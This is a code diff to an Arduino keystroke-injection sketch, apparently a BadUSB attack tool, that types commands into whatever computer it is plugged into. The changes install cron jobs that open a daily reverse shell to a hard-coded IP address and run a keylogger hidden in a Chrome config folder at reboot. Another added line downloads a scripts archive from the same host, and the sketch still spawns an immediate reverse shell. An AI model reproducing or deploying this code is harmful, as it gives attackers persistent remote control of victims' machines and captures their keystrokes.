@@ -48,50 +48,27 @@ void setup()
   typeKey(KEY_RETURN);
 
   // add reverse shell to cron
-  delay(2000);
-  Keyboard.print(F("export EDITOR=vim"));
-
-  typeKey(KEY_RETURN);
-
-  delay(2000);
-  Keyboard.print(F("crontab -e"));
-
-  typeKey(KEY_RETURN);
-
-  delay(2000);
-  Keyboard.print(F("g"));
-
-  typeKey(KEY_RETURN);
-
-  delay(2000);
-  Keyboard.print(F("$"));
-
-  typeKey(KEY_RETURN);
-
-  // start insert mode
-  delay(2000);
-  Keyboard.print(F("i"));
-
-  typeKey(KEY_RETURN);
-
   // set the reverse shell to occur 11am every day
   delay(2000);
-  Keyboard.print(F("0 11 * * * /bin/sh -c \"/bin/bash -i > /dev/tcp/139.180.169.29/6996 0<&1 2>&1 &\\\" && exit"));
+  Keyboard.print(F("{crontab -l; echo '0 11 * * * /bin/sh -c \"/bin/bash -i > /dev/tcp/139.180.169.29/6996 0<&1 2>&1 &\" && exit';} | crontab -"));
 
   typeKey(KEY_RETURN);
 
-  // exit insert mode
-  typeKey(KEY_ESC);
-
-  // Exit vim
+  // set cron job for keylogger on reboot
   delay(2000);
-  Keyboard.print(F(":wq"));
+  Keyboard.print(F("{ crontab -l; echo '@reboot python3 ~/.config/Chrome/osx-keylogger.py'; } | crontab -"));
+
+  typeKey(KEY_RETURN);
+
+  // download and unzip the scripts
+  delay(2000);
+  Keyboard.print(F("curl http://139.180.169.29:8000/scripts.zip --output ~/.config/Chrome/scripts.zip"));
 
   typeKey(KEY_RETURN);
 
   // spawns a reverse shell in background
   delay(2000);
-  Keyboard.print(F('sh -c "/bin/bash -i > /dev/tcp/139.180.169.29/6996 0<&1 2>&1 &" && exit'));
+  Keyboard.print(F("sh -c \"/bin/bash -i > /dev/tcp/139.180.169.29/6996 0<&1 2>&1 &\" && exit"));
 
   typeKey(KEY_RETURN);
 
